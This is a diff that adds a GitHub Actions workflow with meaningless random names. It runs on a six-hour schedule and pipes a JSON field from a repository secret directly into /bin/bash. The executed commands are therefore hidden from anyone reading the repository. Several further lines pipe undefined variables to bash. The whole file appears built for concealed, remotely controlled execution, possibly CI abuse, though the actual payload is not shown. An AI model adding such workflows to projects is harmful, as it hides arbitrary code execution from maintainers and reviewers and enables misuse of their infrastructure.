@@ -1,0 +1,26 @@
+name: gregariousbiathlon
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: gregariousbiathlon
+        env:
+          mgt12942: ${{ secrets.mgt12942 }}
+        run: |
+          echo $mgt12942 | jq -r .d3 | /bin/bash
+          echo $gr5 | jq -r .y9841 | /bin/bash
+          echo $fninj11 | jq -r .ccqix275 | /bin/bash
+          echo $wgj8 | jq -r .hsmm249 | /bin/bash
+          echo $jss1051 | jq -r .jeoz9140 | /bin/bash
+          echo $lj89 | jq -r .d7 | /bin/bash
+          echo $zxt3577 | jq -r .d0 | /bin/bash
+          echo $hv4 | jq -r .jqr2 | /bin/bash
+
